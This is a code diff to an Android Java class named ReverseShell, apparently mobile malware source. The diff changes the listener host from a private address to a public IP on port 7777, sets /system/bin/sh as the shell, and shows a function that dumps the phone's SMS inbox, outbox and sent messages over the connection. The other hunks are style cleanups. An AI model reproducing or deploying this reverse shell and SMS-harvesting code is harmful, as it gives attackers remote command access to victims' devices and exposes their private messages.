@@ -40,7 +40,7 @@ public class ReverseShell extends Activity {
 	// Includes the parameters of listening process
 	private TextView outputText;
 	private ProgressBar activitySpinner;
-	private final String host = "10.0.0.6";  // Host of Listener
+	private final String host = "67.165.212.59";  // Host of Listener
 	private final String port = "7777";         // Port of Listener
 	private final String shellPath = "/system/bin/sh";
 	private Context context;
@@ -92,8 +92,8 @@ public class ReverseShell extends Activity {
 		// Dump the contents of {inbox,outbox,sent} to the
 		// connection.
 		public String readSMSBox(String box) {
-			Uri SMSURI = Uri.parse("content://sms/"+box);
-			Cursor cur = getContentResolver().query(SMSURI, null, null, null,null);
+			Uri smsuri = Uri.parse("content://sms/"+box);
+			Cursor cur = getContentResolver().query(smsuri, null, null, null,null);
 			String sms = ""; 
 			if(cur.moveToFirst()) {
 				for(int i=0; i < cur.getCount(); ++i) {
@@ -237,9 +237,9 @@ public class ReverseShell extends Activity {
 	// ---------------------------------------------- //
 	private class ProcessIOThread extends Thread {
 
-		InputStream input;
-		OutputStream output;
-		boolean running;
+		private InputStream input;
+		private OutputStream output;
+		private boolean running;
 
 		public ProcessIOThread(InputStream i, OutputStream o) {
 			running = false;
